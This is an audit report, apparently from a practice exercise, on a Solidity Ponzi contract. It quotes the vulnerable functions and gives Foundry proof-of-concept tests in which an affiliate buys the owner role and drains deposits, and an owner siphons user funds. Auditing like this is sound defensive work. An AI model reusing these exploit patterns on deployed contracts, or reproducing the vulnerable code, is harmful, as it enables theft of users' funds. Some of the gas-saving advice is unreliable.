# Ponzi Contract Audit.

# 1. Stealing owner's rights and user's funds.
https://github.com/cartlex/PonziContract-Audit/blob/14eef76f48e70c6a2fb10c20a3148d95da6d6b8d/src/PonziContract/PonziContract.sol#L50-L53
## Description
In `PonziContract.sol` there is a function `buyOwnerRole()`. It's possible for any user to call it and claim an owner's rigths for 10 ether.
```
    function buyOwnerRole(address newAdmin) external payable onlyAfilliates {
        require(msg.value == 10 ether, "Invalid Ether amount"); // @audit risk of stealing owner's rights
        _transferOwnership(newAdmin);
    }
```
## POC
```
function testBuyOwnerRole() public {
        uint256 multiplier = 2;
        vm.startPrank(owner);
        ponziContract.addNewAffilliate(address(person1));
        assertEq(ponziContract.owner(), address(owner));
        assertEq(address(person1).balance, ETHER_TO_TRANSFER);

        changePrank(person1);
        // person1 buying contract owner position
        ponziContract.buyOwnerRole{value: ETHER_TO_TRANSFER}(address(person1));
        assertEq(ponziContract.owner(), address(person1));
        // person1 withdraw funds from contract.
        ponziContract.ownerWithdraw(address(person1), address(ponziContract).balance);
        assertEq(address(person1).balance, ETHER_TO_TRANSFER * multiplier);
        vm.stopPrank();
    }
```
`Person1` successfully steal users funds.

## Recomendation
Remove possibility to buy owners rigths.


# 2. Users lost their funds calling `JoinPonzi()` function.
https://github.com/cartlex/PonziContract-Audit/blob/14eef76f48e70c6a2fb10c20a3148d95da6d6b8d/src/PonziContract/PonziContract.sol#L32-L48
## Description
In `PonziContract.sol` there is a function `joinPonzi()`. Calling this function has no effect for user except just waste gas. One possible attack that owner can add himself twice or more into `_afilliates` array and user just lose his funds.
```
    function joinPonzi(
        address[] calldata _afilliates
    ) external payable nonReentrant {
        require(
            block.timestamp < registrationDeadline,
            "Registration not Active!"
        );
        require(_afilliates.length == affiliatesCount, "Invalid length");
        require(msg.value == affiliatesCount * 1 ether, "Insufficient Ether");
        for (uint256 i = 0; i < _afilliates.length; i++) {
            _afilliates[i].call{value: 1 ether}("");
        }
        affiliatesCount += 1;

        affiliates[msg.sender] = true; 
        affiliates_.push(msg.sender);
    }
```
## POC
```
function testJoinPonziOwnerScam() public {
        uint256 deadlineOk = 2000;
        vm.startPrank(owner);
        ponziContract.setDeadline(deadlineOk);
        ponziContract.addNewAffilliate(address(person1));
        ponziContract.addNewAffilliate(address(owner));
        ponziContract.addNewAffilliate(address(owner));

        changePrank(person1);

        address[] memory affilatesArray = new address[](3);
        affilatesArray[0] = address(person1);
        affilatesArray[1] = address(owner);
        affilatesArray[2] = address(owner);

        // Person1 deposit 3 ether, but lost 2 of them.
        changePrank(person1);
        assertEq(address(owner).balance, 0);
        ponziContract.joinPonzi{value: 3 ether}(affilatesArray);

        assertEq(address(person1).balance, 8 ether);
        assertEq(address(owner).balance, 2 ether);

        changePrank(owner);
        ponziContract.ownerWithdraw(owner, 2 ether);
        assertEq(address(owner).balance, 2 ether);
    }
```

# 3. Rugpull. Owner can steal funds from contract.
https://github.com/cartlex/PonziContract-Audit/blob/14eef76f48e70c6a2fb10c20a3148d95da6d6b8d/src/PonziContract/PonziContract.sol#L55-L58
## Description
Owner of the `PonziContract.sol` can withdraw funds from the contract anytime calling `ownerWithdraw()` function.
```
    function ownerWithdraw(address to, uint256 amount) external onlyOwner { // @audit risk of centralization
        payable(to).call{value: amount}("");
        emit Withdraw(amount);
    }
```
## Recomendation
Remove `ownerWithdraw()` function.

# LOW FINDINGS
## 4. Use newer solidity version.
## Description 
When deploying contracts, you should use the latest released version of Solidity. Apart from exceptional cases, only the latest version receives security fixes.

## 5. Using ++i instead of i++ save gas.
https://github.com/cartlex/PonziContract-Audit/blob/14eef76f48e70c6a2fb10c20a3148d95da6d6b8d/src/PonziContract/PonziContract.sol#L18
```
    for (uint256 i = 0; i < affiliatesCount; i++) { 
```
https://github.com/cartlex/PonziContract-Audit/blob/14eef76f48e70c6a2fb10c20a3148d95da6d6b8d/src/PonziContract/PonziContract.sol#L41C9-L41C59
```
    for (uint256 i = 0; i < _afilliates.length; i++) {
```

## 6. Using `unchecked` block in `for` loop since it impossible to underflow.
https://github.com/cartlex/PonziContract-Audit/blob/14eef76f48e70c6a2fb10c20a3148d95da6d6b8d/src/PonziContract/PonziContract.sol#L18
```
    for (uint256 i = 0; i < affiliatesCount;) { 
        ...
        unchecked {
            i++;
        }
```
https://github.com/cartlex/PonziContract-Audit/blob/14eef76f48e70c6a2fb10c20a3148d95da6d6b8d/src/PonziContract/PonziContract.sol#L41C9-L41C59
```
    for (uint256 i = 0; i < _afilliates.length;) {
        ...
        unchecked {
            i++;
        }
```

## 7. Not using empty `receive()` function. Users can lost their funds sending it to contract.
https://github.com/cartlex/PonziContract-Audit/blob/14eef76f48e70c6a2fb10c20a3148d95da6d6b8d/src/PonziContract/PonziContract.sol#L66
```
    receive() external payable {}
```
## 8. Using + instead of += is cheaper.
https://github.com/cartlex/PonziContract-Audit/blob/14eef76f48e70c6a2fb10c20a3148d95da6d6b8d/src/PonziContract/PonziContract.sol#L44
```
    affiliatesCount += 1; 
```
https://github.com/cartlex/PonziContract-Audit/blob/14eef76f48e70c6a2fb10c20a3148d95da6d6b8d/src/PonziContract/PonziContract.sol#L61
```
    affiliatesCount += 1;
```

## 9. Using custom errors cheaper than require.
https://github.com/cartlex/PonziContract-Audit/blob/14eef76f48e70c6a2fb10c20a3148d95da6d6b8d/src/PonziContract/PonziContract.sol#L23
```
    require(affiliate == true, "Not an Affiliate!");
```
https://github.com/cartlex/PonziContract-Audit/blob/14eef76f48e70c6a2fb10c20a3148d95da6d6b8d/src/PonziContract/PonziContract.sol#L39-L40
```
    require(_afilliates.length == affiliatesCount, "Invalid length");
    require(msg.value == affiliatesCount * 1 ether, "Insufficient Ether");
```
https://github.com/cartlex/PonziContract-Audit/blob/14eef76f48e70c6a2fb10c20a3148d95da6d6b8d/src/PonziContract/PonziContract.sol#L51
```
    require(msg.value == 10 ether, "Invalid Ether amount");
```